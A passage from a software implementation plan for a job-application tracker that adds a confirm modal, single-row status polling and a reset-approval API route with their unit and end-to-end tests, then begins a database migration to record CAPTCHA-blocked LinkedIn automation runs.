- Create: `contact-manager/src/app/api/applications/[id]/reset-approval/route.test.ts`

**Interfaces:**
- Consumes: `ConfirmModal` (`contact-manager/src/components/ui/ConfirmModal.tsx`) exactly as it exists today — no changes to that file. `POST /api/applications/[id]/submit`'s RPC gate from Task 2.
- Produces (I8 — redesigned from an earlier draft of this plan that polled the stage-filtered
  list, which could never distinguish "still running" from "the submission failed" — a row
  stuck at `ready_to_submit` looked identical either way, and the whole 90s timeout was spent
  every time a submission failed early): `GET /api/applications/[id]` returning
  `{ application: JobApplication }` for one row — added to `[id]/route.ts`, the same file Task 2
  already modifies for `PATCH`, alongside a new `GET` `describe` block in that file's existing
  test file rather than a new one. Polling now hits this single-row endpoint and branches on
  `stage === "applied"` (success), `apply_blocked_reason != null` (failed/blocked), or timeout
  (ambiguous). Also produces `POST /api/applications/[id]/reset-approval`, a thin wrapper around
  Task 1's `reset_approval` RPC — needed because a row that reaches `apply_blocked_reason != null`
  still has `approved_at` set (the dispatch itself succeeded; `apply_agent.py` failed downstream,
  inside the workflow, which this Next.js app has no other way to react to), so simply re-clicking
  "Approve & Submit" would 409 against `approve_application`'s own already-approved guard. The
  UI's "Try again" action calls this route first, then re-enables the normal approve flow.

- [ ] **Step 1: Delete the superseded pre-existing test (C2)**

`contact-manager/src/components/ApplicationsPage.test.tsx` already contains a test that directly
contradicts the behavior this task builds — it asserts Approve & Submit posts immediately, with
no confirm step, which is exactly what this task changes. Delete this exact block (confirmed
against the live file):

```tsx
  it("clicking Approve & Submit posts to the submit route", async () => {
    const user = userEvent.setup();
    render(<ApplicationsPage />);
    await screen.findByText("Ashby Co");
    await user.click(screen.getByRole("button", { name: /approve & submit/i }));
    await waitFor(() => {
      expect(global.fetch).toHaveBeenCalledWith(
        "/api/applications/5/submit",
        expect.objectContaining({ method: "POST" })
      );
    });
  });
```

The new `describe("ApplicationsPage -- confirm modal and status polling (U4/U5)")` block added
below supersedes it — its own `"submits only after confirming in the modal"` test covers the
same underlying behavior (a POST to `/api/applications/5/submit`), just gated behind the modal
confirm click instead of the bare button click. Leave the two tests directly above it in the
same file (`"shows an Approve & Submit button for a ready_to_submit row"` and whatever precedes
it) untouched — only this one block is superseded.

- [ ] **Step 2: Write the failing tests**

`contact-manager/src/components/ApplicationsPage.test.tsx` — this task's `submittingIds`
implementation (Step 5 below) reads and writes real browser `sessionStorage` (M14), and nothing
in the file's shared `beforeEach` (defined in Task 3, Step 9) clears it between tests. Without a
clear, a submit-flow test that sets `sessionStorage["applications_submitting_ids"]` (e.g.
`"submits only after confirming in the modal"`) leaks that value into every test that runs
after it in the same file — including this task's own `"shows a submitting state..."` test,
which would then render `Submitting...` instead of the `Approve & Submit` button it expects to
click, before it ever triggers its own submission. Add `sessionStorage.clear();` as the first
line of that shared `beforeEach`, right before `toastErrorMock.mockClear();`.

Add the `@radix-ui/react-dialog` mock (needed for `ConfirmModal`, which is built on it) right after the `@radix-ui/react-select` mock added in Task 6:

```tsx
vi.mock("@radix-ui/react-dialog", () => ({
  Root: ({
    children,
    open,
    onOpenChange,
  }: {
    children: React.ReactNode;
    open?: boolean;
    onOpenChange?: (o: boolean) => void;
  }) =>
    open ? (
      <div data-testid="confirm-modal" onKeyDown={(e) => e.key === "Escape" && onOpenChange?.(false)}>
        {children}
      </div>
    ) : null,
  Portal: ({ children }: { children: React.ReactNode }) => <>{children}</>,
  Overlay: () => <div />,
  Content: ({ children }: { children: React.ReactNode }) => (
    <div role="dialog" data-testid="confirm-content">
      {children}
    </div>
  ),
  Title: ({ children }: { children: React.ReactNode }) => <h2>{children}</h2>,
  Description: ({
    children,
    asChild,
  }: {
    children: React.ReactNode;
    asChild?: boolean;
  }) => (asChild ? <>{children}</> : <p>{children}</p>),
  Close: ({ children }: { children: React.ReactNode }) => <>{children}</>,
}));
```

Add `import { act } from "@testing-library/react";` alongside the existing `render, screen, waitFor, within` import (change that import line to `import { render, screen, waitFor, within, act } from "@testing-library/react";`). Add a new `describe` block at the end of the file:

```tsx
describe("ApplicationsPage -- confirm modal and status polling (U4/U5)", () => {
  it("opens a confirm modal instead of submitting immediately", async () => {
    const user = userEvent.setup();
    render(<ApplicationsPage />);
    await screen.findByText("Ashby Co");
    await user.click(screen.getByRole("button", { name: /approve & submit/i }));
    expect(await screen.findByTestId("confirm-content")).toBeInTheDocument();
    expect(within(screen.getByTestId("confirm-content")).getByText(/Ashby Co/)).toBeInTheDocument();
    // Confirming has not happened yet -- no submit POST fired from the click alone.
    expect(global.fetch).not.toHaveBeenCalledWith(
      "/api/applications/5/submit",
      expect.objectContaining({ method: "POST" })
    );
  });

  it("submits only after confirming in the modal", async () => {
    const user = userEvent.setup();
    render(<ApplicationsPage />);
    await screen.findByText("Ashby Co");
    await user.click(screen.getByRole("button", { name: /approve & submit/i }));
    const modal = await screen.findByTestId("confirm-content");
    await user.click(within(modal).getByRole("button", { name: /approve & submit/i }));
    await waitFor(() => {
      expect(global.fetch).toHaveBeenCalledWith(
        "/api/applications/5/submit",
        expect.objectContaining({ method: "POST" })
      );
    });
  });

  it("shows a submitting state for the row and polls GET /api/applications/5 until it reports applied (I8 -- single-row polling, not the filtered list)", async () => {
    vi.useFakeTimers();
    const user = userEvent.setup({ delay: null });
    render(<ApplicationsPage />);
    await screen.findByText("Ashby Co");
    await user.click(screen.getByRole("button", { name: /approve & submit/i }));
    const modal = await screen.findByTestId("confirm-content");
    await user.click(within(modal).getByRole("button", { name: /approve & submit/i }));

    await waitFor(() => {
      expect(global.fetch).toHaveBeenCalledWith(
        "/api/applications/5/submit",
        expect.objectContaining({ method: "POST" })
      );
    });
    expect(screen.getByText(/submitting/i)).toBeInTheDocument();

    (global.fetch as ReturnType<typeof vi.fn>).mockImplementationOnce((url: string) => {
      if (typeof url === "string" && url === "/api/applications/5") {
        return Promise.resolve({
          ok: true,
          json: async () => ({ application: { id: "5", stage: "applied", apply_blocked_reason: null } }),
        } as Response);
      }
      return Promise.resolve({ ok: true, json: async () => ({ applications: [] }) } as Response);
    });

    await act(async () => {
      await vi.advanceTimersByTimeAsync(5000);
    });

    await waitFor(() => {
      expect(toastSuccessMock).toHaveBeenCalledWith("Application submitted");
    });
    vi.useRealTimers();
  });

  it("shows a distinct failed/blocked state (not the generic timeout message) and a Try again action when the row reports apply_blocked_reason (I8)", async () => {
    vi.useFakeTimers();
    const user = userEvent.setup({ delay: null });
    render(<ApplicationsPage />);
    await screen.findByText("Ashby Co");
    await user.click(screen.getByRole("button", { name: /approve & submit/i }));
    const modal = await screen.findByTestId("confirm-content");
    await user.click(within(modal).getByRole("button", { name: /approve & submit/i }));
    await waitFor(() => {
      expect(global.fetch).toHaveBeenCalledWith(
        "/api/applications/5/submit",
        expect.objectContaining({ method: "POST" })
      );
    });

    (global.fetch as ReturnType<typeof vi.fn>).mockImplementationOnce((url: string) => {
      if (typeof url === "string" && url === "/api/applications/5") {
        return Promise.resolve({
          ok: true,
          json: async () => ({
            application: {
              id: "5",
              stage: "ready_to_submit",
              apply_blocked_reason: "confirmation element not found after clicking Submit",
            },
          }),
        } as Response);
      }
      return Promise.resolve({ ok: true, json: async () => ({ applications: [] }) } as Response);
    });

    await act(async () => {
      await vi.advanceTimersByTimeAsync(5000);
    });

    expect(await screen.findByText(/confirmation element not found/i)).toBeInTheDocument();
    const tryAgainButton = screen.getByRole("button", { name: /try again/i });

    (global.fetch as ReturnType<typeof vi.fn>).mockImplementationOnce((url: string, opts?: RequestInit) => {
      if (typeof url === "string" && url === "/api/applications/5/reset-approval" && opts?.method === "POST") {
        return Promise.resolve({ ok: true, json: async () => ({ ok: true }) } as Response);
      }
      return Promise.resolve({ ok: true, json: async () => ({ applications: [] }) } as Response);
    });
    await user.click(tryAgainButton);
    await waitFor(() => {
      expect(global.fetch).toHaveBeenCalledWith(
        "/api/applications/5/reset-approval",
        expect.objectContaining({ method: "POST" })
      );
    });
    // Once reset, the row is back to a plain Approve & Submit state, not stuck "submitting".
    expect(screen.getByRole("button", { name: /approve & submit/i })).toBeInTheDocument();
    vi.useRealTimers();
  });

  it("still shows the ambiguous timeout message when polling exceeds the timeout with no resolution either way", async () => {
    vi.useFakeTimers();
    const user = userEvent.setup({ delay: null });
    render(<ApplicationsPage />);
    await screen.findByText("Ashby Co");
    await user.click(screen.getByRole("button", { name: /approve & submit/i }));
    const modal = await screen.findByTestId("confirm-content");
    await user.click(within(modal).getByRole("button", { name: /approve & submit/i }));
    await waitFor(() => {
      expect(global.fetch).toHaveBeenCalledWith(
        "/api/applications/5/submit",
        expect.objectContaining({ method: "POST" })
      );
    });

    (global.fetch as ReturnType<typeof vi.fn>).mockImplementation((url: string) => {
      if (typeof url === "string" && url === "/api/applications/5") {
        return Promise.resolve({
          ok: true,
          json: async () => ({ application: { id: "5", stage: "ready_to_submit", apply_blocked_reason: null } }),
        } as Response);
      }
      return Promise.resolve({ ok: true, json: async () => ({ applications: [] }) } as Response);
    });

    await act(async () => {
      await vi.advanceTimersByTimeAsync(95000);
    });

    await waitFor(() => {
      expect(toastErrorMock).toHaveBeenCalledWith("Still processing -- check back in a bit");
    });
    vi.useRealTimers();
  });

  it("persists submittingIds to sessionStorage so a page refresh mid-poll doesn't re-enable Approve (M14 -- same precedent as QueuePage's skip-list)", async () => {
    const user = userEvent.setup();
    render(<ApplicationsPage />);
    await screen.findByText("Ashby Co");
    await user.click(screen.getByRole("button", { name: /approve & submit/i }));
    const modal = await screen.findByTestId("confirm-content");
    await user.click(within(modal).getByRole("button", { name: /approve & submit/i }));
    await waitFor(() => {
      expect(global.fetch).toHaveBeenCalledWith(
        "/api/applications/5/submit",
        expect.objectContaining({ method: "POST" })
      );
    });
    await waitFor(() => {
      const raw = sessionStorage.getItem("applications_submitting_ids");
      expect(raw ? (JSON.parse(raw) as string[]) : []).toContain("5");
    });
  });
});
```

- [ ] **Step 3: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationsPage.test.tsx`
Expected: the deleted test is gone (no failure from it). The new `describe` block's tests FAIL —
`handleApprove` still submits directly on click, so no `ConfirmModal` opens; there is no
`"submitting"` state, no single-row polling, no `GET /api/applications/[id]` call, no
`reset-approval` call, and nothing persisted to `sessionStorage`.

- [ ] **Step 4: Implement — add the single-row GET route and the reset-approval route first**

These two small backend routes are prerequisites for the frontend polling logic below.

`contact-manager/src/app/api/applications/[id]/route.ts` — add a `GET` handler alongside the
existing `PATCH` (Task 2 already imports `createClient`/`getClient` in this file; reuse it):

```ts
export async function GET(req: Request, { params }: { params: Promise<{ id: string }> }) {
  const { id } = await params;
  if (!/^\d+$/.test(id)) {
    return Response.json({ error: "Invalid application id" }, { status: 400 });
  }
  try {
    const supabase = getClient();
    const { data, error } = await supabase
      .from("job_applications")
      .select("*")
      .eq("id", Number(id))
      .single();
    if (error) throw error;
    return Response.json({ application: data });
  } catch (err) {
    return Response.json({ error: String(err) }, { status: 500 });
  }
}
```

`contact-manager/src/app/api/applications/[id]/route.test.ts` — Task 2 already modifies this
file for `PATCH`; add a `GET` describe block to it (matching the existing mock setup pattern —
do not create a new test file):

```ts
describe("GET /api/applications/[id] (I8 -- single-row fetch for status polling)", () => {
  it("returns the row for a valid id", async () => {
    mockSingle.mockResolvedValue({ data: { id: "5", stage: "applied", apply_blocked_reason: null }, error: null });
    const res = await GET(new Request("http://test"), params("5"));
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.application).toEqual({ id: "5", stage: "applied", apply_blocked_reason: null });
  });

  it("rejects a non-numeric id", async () => {
    const res = await GET(new Request("http://test"), params("abc"));
    expect(res.status).toBe(400);
  });

  it("returns 500 on a supabase read error", async () => {
    mockSingle.mockResolvedValue({ data: null, error: new Error("db down") });
    const res = await GET(new Request("http://test"), params("5"));
    expect(res.status).toBe(500);
  });
});
```

(Add `GET` to this file's existing `import { PATCH } from "./route";` line, making it
`import { GET, PATCH } from "./route";`.)

`contact-manager/src/app/api/applications/[id]/reset-approval/route.ts` (new file):

```ts
export const runtime = "nodejs";

import { createClient } from "@supabase/supabase-js";

function getClient() {
  return createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
  );
}

export async function POST(req: Request, { params }: { params: Promise<{ id: string }> }) {
  const { id } = await params;
  if (!/^\d+$/.test(id)) {
    return Response.json({ error: "Invalid application id" }, { status: 400 });
  }
  const supabase = getClient();
  const { error } = await supabase.rpc("reset_approval", { p_id: Number(id) });
  if (error) {
    return Response.json({ error: error.message }, { status: 409 });
  }
  return Response.json({ ok: true });
}
```

`contact-manager/src/app/api/applications/[id]/reset-approval/route.test.ts` (new file, mirrors
Task 2's submit-route test pattern):

```ts
import { describe, it, expect, vi, beforeEach } from "vitest";
import { POST } from "./route";

const mockRpc = vi.fn();
vi.mock("@supabase/supabase-js", () => ({
  createClient: vi.fn(() => ({ rpc: mockRpc })),
}));

beforeEach(() => {
  mockRpc.mockReset();
  mockRpc.mockResolvedValue({ data: null, error: null });
});

function makeRequest(id = "5") {
  return { params: Promise.resolve({ id }) };
}

describe("POST /api/applications/[id]/reset-approval", () => {
  it("calls the reset_approval RPC and returns 200", async () => {
    const res = await POST(new Request("http://test", { method: "POST" }), makeRequest());
    expect(res.status).toBe(200);
    expect(mockRpc).toHaveBeenCalledWith("reset_approval", { p_id: 5 });
  });

  it("returns 409 when the RPC rejects the row", async () => {
    mockRpc.mockResolvedValue({ data: null, error: { message: "reset_approval: row 5 is not in a resettable state" } });
    const res = await POST(new Request("http://test", { method: "POST" }), makeRequest());
    expect(res.status).toBe(409);
  });

  it("rejects a non-numeric id without calling the RPC", async () => {
    const res = await POST(new Request("http://test", { method: "POST" }), makeRequest("abc"));
    expect(res.status).toBe(400);
    expect(mockRpc).not.toHaveBeenCalled();
  });
});
```

Run both new/modified backend test files and confirm they pass before moving to the frontend:
`cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/app/api/applications/[id]/route.test.ts src/app/api/applications/[id]/reset-approval/route.test.ts`

- [ ] **Step 5: Implement — wire `ConfirmModal` and single-row polling into `ApplicationsPage.tsx`**

Add imports:

```tsx
import { ConfirmModal } from "@/components/ui/ConfirmModal";
import { Loader2 } from "lucide-react";
import { useRef } from "react";
```

(merge `useRef` into the existing `import { useEffect, useState, type FormEvent } from "react";` line, making it `import { useEffect, useRef, useState, type FormEvent } from "react";`).

Add state right after `selectedApplication`. `submittingIds` is lazily initialized from
`sessionStorage` and persisted back on every change, following the exact precedent already used
for `/queue`'s skip-list in `QueuePage.tsx` (M14 -- without this, a page refresh mid-poll loses
the "submitting" UI state and re-enables an Approve button that, after Task 1's `reset_approval`
guard, can now only hit a 409):

```tsx
  const SUBMITTING_IDS_STORAGE_KEY = "applications_submitting_ids";

  const [confirmingApplication, setConfirmingApplication] = useState<JobApplication | null>(null);
  const [approveLoading, setApproveLoading] = useState(false);
  const [submittingIds, setSubmittingIds] = useState<Set<string>>(() => {
    try {
      const raw = sessionStorage.getItem(SUBMITTING_IDS_STORAGE_KEY);
      return raw ? new Set(JSON.parse(raw) as string[]) : new Set();
    } catch {
      return new Set();
    }
  });
  // Keyed the same way as submittingIds: id -> the row's last-known apply_blocked_reason once
  // polling observes one, so the UI can show a specific failure and a Try again action instead
  // of leaving the row looking stuck until the 90s timeout.
  const [blockedReasons, setBlockedReasons] = useState<Record<string, string>>({});
  const pollTimers = useRef<Record<string, ReturnType<typeof setTimeout>>>({});

  useEffect(() => {
    try {
      sessionStorage.setItem(SUBMITTING_IDS_STORAGE_KEY, JSON.stringify([...submittingIds]));
    } catch {
      // sessionStorage unavailable
    }
  }, [submittingIds]);

  useEffect(() => {
    return () => {
      Object.values(pollTimers.current).forEach(clearTimeout);
    };
  }, []);
```

Replace `handleApprove` entirely with (I8 -- polls the single row via `GET
/api/applications/[id]` instead of the stage-filtered list, so "still running" and "the
submission failed" are no longer indistinguishable):

```tsx
  const POLL_INTERVAL_MS = 5000;
  const POLL_TIMEOUT_MS = 90000;

  const stopPolling = (id: string) => {
    setSubmittingIds((cur) => {
      const next = new Set(cur);
      next.delete(id);
      return next;
    });
    delete pollTimers.current[id];
  };

  const pollForCompletion = (id: string) => {
    const startedAt = Date.now();
    const tick = async () => {
      if (Date.now() - startedAt > POLL_TIMEOUT_MS) {
        stopPolling(id);
        toast.error("Still processing -- check back in a bit");
        return;
      }
      try {
        const res = await fetch(`/api/applications/${id}`);
        const data = await res.json();
        const app: { stage?: string; apply_blocked_reason?: string | null } | undefined =
          data.application;
        if (app?.stage === "applied") {
          stopPolling(id);
          toast.success("Application submitted");
          load(stageFilter, sourceFilter);
          return;
        }
        if (app?.apply_blocked_reason) {
          stopPolling(id);
          setBlockedReasons((cur) => ({ ...cur, [id]: app.apply_blocked_reason as string }));
          toast.error("Submission failed -- see the row for details");
          return;
        }
      } catch {
        // best-effort poll; retry on the next tick
      }
      pollTimers.current[id] = setTimeout(tick, POLL_INTERVAL_MS);
    };
    pollTimers.current[id] = setTimeout(tick, POLL_INTERVAL_MS);
  };

  const doApprove = async () => {
    if (!confirmingApplication) return;
    const app = confirmingApplication;
    setApproveLoading(true);
    try {
      const res = await fetch(`/api/applications/${app.id}/submit`, { method: "POST" });
      if (!res.ok) {
        const errBody = await res.json().catch(() => ({}));
        throw new Error(errBody.error || "request failed");
      }
      toast.success("Submission triggered -- watching for it to land");
      setBlockedReasons((cur) => {
        const next = { ...cur };
        delete next[app.id];
        return next;
      });
      setSubmittingIds((cur) => new Set(cur).add(app.id));
      pollForCompletion(app.id);
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Could not trigger submission");
    } finally {
      setApproveLoading(false);
      setConfirmingApplication(null);
    }
  };

  // I8: a row that ends up here still has approved_at set (the dispatch itself succeeded;
  // apply_agent.py failed downstream, inside the workflow) -- re-clicking Approve & Submit
  // directly would just 409 against approve_application's own already-approved guard. Clear it
  // via Task 1's reset_approval RPC first, then the row is a normal candidate for Approve again.
  const handleTryAgain = async (id: string) => {
    try {
      const res = await fetch(`/api/applications/${id}/reset-approval`, { method: "POST" });
      if (!res.ok) throw new Error("request failed");
      setBlockedReasons((cur) => {
        const next = { ...cur };
        delete next[id];
        return next;
      });
      load(stageFilter, sourceFilter);
    } catch {
      toast.error("Could not reset -- try again in a moment");
    }
  };
```

Change the "Preview / Submit" cell's button block from:

```tsx
                  {app.stage === "ready_to_submit" && app.apply_preview ? (
                    <div className="flex flex-col gap-1">
                      <span className="text-fg-dim text-xs">
                        {Object.entries(app.apply_preview.screening_answers).length} screening answer(s)
                      </span>
                      <button
                        type="button"
                        onClick={() => handleApprove(app.id)}
                        className="px-2 py-1 bg-emerald-600 text-white rounded-md text-xs w-fit"
                      >
                        Approve & Submit
                      </button>
                    </div>
                  ) : (
                    <span className="text-fg-dim">—</span>
                  )}
```

to:

```tsx
                  {app.stage === "ready_to_submit" && app.apply_preview ? (
                    <div className="flex flex-col gap-1">
                      <span className="text-fg-dim text-xs">
                        {Object.entries(app.apply_preview.screening_answers).length} screening answer(s)
                      </span>
                      {submittingIds.has(app.id) ? (
                        <span className="text-fg-dim text-xs flex items-center gap-1">
                          <Loader2 className="size-3 animate-spin" /> Submitting...
                        </span>
                      ) : blockedReasons[app.id] ? (
                        <div className="flex flex-col gap-1">
                          <span className="text-red-400 text-xs">{blockedReasons[app.id]}</span>
                          <button
                            type="button"
                            onClick={() => handleTryAgain(app.id)}
                            className="px-2 py-1 bg-surface-2 text-fg-muted rounded-md text-xs border border-border hover:text-fg w-fit"
                          >
                            Try again
                          </button>
                        </div>
                      ) : (
                        <button
                          type="button"
                          onClick={() => setConfirmingApplication(app)}
                          className="px-2 py-1 bg-emerald-600 text-white rounded-md text-xs w-fit"
                        >
                          Approve & Submit
                        </button>
                      )}
                    </div>
                  ) : (
                    <span className="text-fg-dim">—</span>
                  )}
```

Add `<ConfirmModal>` right after `<ApplicationDetailSheet ... />`, before the closing `</div>`:

```tsx
      <ConfirmModal
        open={confirmingApplication !== null}
        title="Submit this application?"
        body={
          confirmingApplication ? (
            <p>
              This will submit a real application to <strong>{confirmingApplication.company}</strong>{" "}
              for <strong>{confirmingApplication.role}</strong>. This cannot be undone.
            </p>
          ) : null
        }
        confirmLabel="Approve & Submit"
        confirmVariant="primary"
        onConfirm={doApprove}
        onCancel={() => setConfirmingApplication(null)}
        loading={approveLoading}
      />
```

- [ ] **Step 6: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationsPage.test.tsx`
Expected: all tests PASS (the deleted C2 test is gone; every test in the new `describe` block passes).

- [ ] **Step 7: Run the full vitest suite and typecheck**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npm test && npx tsc --noEmit`
Expected: 0 failures, no type errors.

- [ ] **Step 8: Extend the e2e spec for the approve flow**

`contact-manager/tests/e2e/18-applications.spec.ts` — update the shared `applicationsHandler`
function (Task 3's `beforeEach`, registered for both `**/api/applications` and
`**/api/applications?*`) to return a two-row array (append a `ready_to_submit` row), and add
three new route stubs: the submit route, a `/2/files` stub (C6 — without this, opening the
second row's sheet hits the real dev server), and a single-row `GET /api/applications/2` stub
for this task's polling (I8):

```ts
    const applicationsHandler = async (route: import("@playwright/test").Route) => {
      if (route.request().method() === "GET") {
        await route.fulfill({
          status: 200,
          contentType: "application/json",
          body: JSON.stringify({
            applications: [
              { id: "1", contact_id: null, company: "Acme", role: "PM",
                job_url: "https://jobs.acme.example/1", source: "manual", source_channel: null,
                stage: "saved", applied_date: null, notes: null,
                posting_snapshot: { description: "Own the roadmap.", location: "Remote" },
                resume_file_ref: null, cover_letter_file_ref: null,
                resume_cost_usd: null, resume_tokens_input: null, resume_tokens_output: null,
                pick_verdict: null, pick_score: null, pick_reasoning: null,
                apply_preview: null, apply_blocked_reason: null, approved_at: null,
                created_at: "2026-08-26T00:00:00Z", updated_at: "2026-08-26T00:00:00Z" },
              { id: "2", contact_id: null, company: "Ashby Co", role: "PM",
                job_url: "https://jobs.example/2", source: "jobright", source_channel: null,
                stage: "ready_to_submit", applied_date: null, notes: null,
                posting_snapshot: null, resume_file_ref: null, cover_letter_file_ref: null,
                resume_cost_usd: null, resume_tokens_input: null, resume_tokens_output: null,
                pick_verdict: "strong", pick_score: 0.9, pick_reasoning: "Great fit.",
                apply_preview: { platform: "ashby", field_values: {}, eligibility_answers: {}, screening_answers: {} },
                apply_blocked_reason: null, approved_at: null,
                created_at: "2026-08-30T00:00:00Z", updated_at: "2026-08-30T00:00:00Z" },
            ],
          }),
        });
      } else {
        await route.continue();
      }
    };
```

(This replaces Task 3's version of the same function -- same name, same two registrations, only
the fixture body changes.) Add the new route stubs right after the existing
`**/api/applications/1/files` stub:

```ts
    await page.route("**/api/applications/2/files", async (route) => {
      await route.fulfill({
        status: 200,
        contentType: "application/json",
        body: JSON.stringify({
          resume_url: null,
          resume_error: false,
          cover_letter_url: null,
          cover_letter_error: false,
        }),
      });
    });
    await page.route("**/api/applications/2/submit", async (route) => {
      await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ ok: true }) });
    });
    await page.route("**/api/applications/2", async (route) => {
      // I8's single-row polling target. Distinct from "**/api/applications" (the list, no
      // trailing path segment) and from "**/api/applications/2/submit" / ".../2/files" (both
      // have an extra path segment) -- Playwright's glob match requires the URL to end exactly
      // where each pattern ends, so these four registrations don't collide.
      await route.fulfill({
        status: 200,
        contentType: "application/json",
        body: JSON.stringify({
          application: { id: "2", stage: "applied", apply_blocked_reason: null },
        }),
      });
    });
```

**C6 — also scope Task 3's earlier "View" click test, which now breaks with a second row
present.** Find this exact test (added in Task 3, Step 13/14) and replace it:

```ts
  test("opens the detail sheet and shows job details on View click", async ({ page }) => {
    await page.goto("/applications");
    await page.getByRole("button", { name: "View" }).click();
    await expect(page.getByText("Own the roadmap.")).toBeVisible();
    await expect(page.getByText("Remote")).toBeVisible();
    await expect(page.getByText("No resume on file yet.")).toBeVisible();
    await page.screenshot({ path: "tests/e2e/screenshots/18-applications-detail-sheet.png" });
  });
```

with a version that scopes the click to the Acme row (Playwright locators are strict by
default -- an unscoped `getByRole("button", { name: "View" })` now matches two buttons and
throws):

```ts
  test("opens the detail sheet and shows job details on View click", async ({ page }) => {
    await page.goto("/applications");
    await page.getByRole("row", { name: /Acme/ }).getByRole("button", { name: "View" }).click();
    await expect(page.getByText("Own the roadmap.")).toBeVisible();
    await expect(page.getByText("Remote")).toBeVisible();
    await expect(page.getByText("No resume on file yet.")).toBeVisible();
    await page.screenshot({ path: "tests/e2e/screenshots/18-applications-detail-sheet.png" });
  });
```

Add a new test at the end of the `test.describe` block:

```ts
  test("confirms before submitting and shows the confirm dialog copy", async ({ page }) => {
    await page.goto("/applications");
    await page.getByRole("button", { name: "Approve & Submit" }).click();
    await expect(page.getByText("Submit this application?")).toBeVisible();
    // I10: getByText(/Ashby Co/) alone matches both the table cell AND the modal -- scope to
    // the dialog.
    await expect(page.getByRole("dialog").getByText(/Ashby Co/)).toBeVisible();
    await page.getByRole("dialog").getByRole("button", { name: "Approve & Submit" }).click();
    await expect(page.getByText(/watching for it to land/i)).toBeVisible();
    await page.screenshot({ path: "tests/e2e/screenshots/18-applications-confirm-modal.png" });
  });
```

- [ ] **Step 9: Run the e2e suite, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx playwright test tests/e2e/18-applications.spec.ts`
Expected: all tests PASS, including the re-scoped Task 3 test. Read `tests/e2e/screenshots/18-applications-confirm-modal.png` and confirm it visually shows the open confirm dialog with the company name.

- [ ] **Step 10: Commit**

```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && git add contact-manager/src/components/ApplicationsPage.tsx contact-manager/src/components/ApplicationsPage.test.tsx contact-manager/tests/e2e/18-applications.spec.ts contact-manager/src/app/api/applications/[id]/route.ts contact-manager/src/app/api/applications/[id]/route.test.ts contact-manager/src/app/api/applications/[id]/reset-approval && git commit -m "$(cat <<'EOF'
feat(applications): ConfirmModal + single-row status polling on approve (U4/U5)

Approve & Submit now opens the existing ConfirmModal (reused, not
reinvented) before calling POST /api/applications/[id]/submit. On
success the row shows a Submitting spinner and polls the new
GET /api/applications/[id] every 5s (90s timeout), branching on
stage === "applied" (success), apply_blocked_reason != null
(failed/blocked -- shown with a Try again action), or timeout
(ambiguous) -- replacing an earlier design that polled the
stage-filtered list and could never tell "still running" apart from
"the submission failed", since a stuck ready_to_submit row looked the
same either way.

New POST /api/applications/[id]/reset-approval wraps Task 1's
reset_approval RPC for the Try again action: a row that fails inside
the GHA workflow (not at dispatch time, which Task 2's submit route
already recovers from) still has approved_at set, so simply retrying
would 409 against approve_application's own already-approved guard.

submittingIds now persists to sessionStorage (same precedent as
/queue's skip-list) so a page refresh mid-poll doesn't lose the
Submitting state and re-enable an Approve button that can now only
409.

Also deletes a pre-existing test that directly contradicted this
task's new behavior (asserted an immediate POST with no confirm step),
and fixes two e2e locator-strictness issues introduced by this task's
own two-row fixture: the earlier single-row "View" test needed
row-scoping, and the confirm dialog's company-name assertion needed
scoping to the dialog.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_016LHvBT9KJnAoXtWu6UyBNH
EOF
)"
```

---

### Task 8: `cu_linkedin.py` blocked-status signal + migration widening `agent_runs.status` (U14 data/agent layer)

**Files:**
- Create: `supabase/migrations/20260925000001_widen_agent_runs_status_and_add_health_view.sql`
- Modify: `cu_linkedin.py`
- Modify: `tests/test_cu_linkedin_run.py`

**Interfaces:**
- Produces: `agent_runs.status` CHECK constraint now allows `'success' | 'failure' | 'blocked'`; a new view `agent_runs_latest_by_source` (one row per distinct `source`, the most recent by `ran_at`), granted `SELECT` to `anon` — Task 9's `/api/system-health` route queries it directly.

**Ordering note:** the migration in this task is a hard prerequisite for the `cu_linkedin.py` code change, and the failure mode if applied out of order is silent — `run()` wraps its `record_run` call in a bare `try/except` that only logs a warning, so a live CAPTCHA-blocked run against an unwidened CHECK constraint would fail its `record_run` insert, log a warning, and the blocked signal would simply vanish with no test able to catch it (tests mock `db.record_run` entirely). Apply the migration (Steps 1-3) before touching `cu_linkedin.py` (Steps 4+).

- [ ] **Step 1: Write the migration file**

```sql
-- M2 / U14: cu_linkedin.py needs a real, distinguishable signal for "stopped because a human
-- is needed" (CAPTCHA/login challenge) -- today a CAPTCHA stop falls through to the normal
-- end-of-run record_run call, which reports status='success'. (M17 correction: errors does NOT
-- necessarily stay 0 in that branch -- `errors += session_errors` executes BEFORE the CAPTCHA
-- check in the real cu_linkedin.py, so a CAPTCHA hit after prior action failures in the same
-- session already records status='failure' today, not 'success'. Either way, a blocked session
-- is never distinguishable from a normal one via status alone -- it reports whatever the
-- ordinary error-count-based success/failure branch would have reported, with no signal that a
-- human is actually needed at the console.) Widen the CHECK constraint to add 'blocked' as a
-- third allowed status.
--
-- Do not assume the constraint's name -- docs/python/db-schema.md documents that the live
-- schema has drifted from setup_supabase.sql before (undocumented columns like agent_runs
-- itself gained a `source` column with no corresponding migration). Discover it via
-- pg_constraint, mirroring supabase/migrations/20260801005138_add_networking_mode.sql's
-- pattern for contacts.mode, rather than hardcoding "agent_runs_status_check".
DO $$
DECLARE
  con RECORD;
BEGIN
  -- Loop (M3), not a single SELECT INTO -- if more than one CHECK constraint on this table
  -- ever matches '%status%', a single-row SELECT INTO would silently drop only the first and
  -- leave the rest behind. Today there's exactly one such constraint (confirmed live), but a
  -- loop costs nothing and doesn't depend on that staying true.
  FOR con IN
    SELECT conname
    FROM pg_constraint
    WHERE conrelid = 'agent_runs'::regclass
      AND contype = 'c'
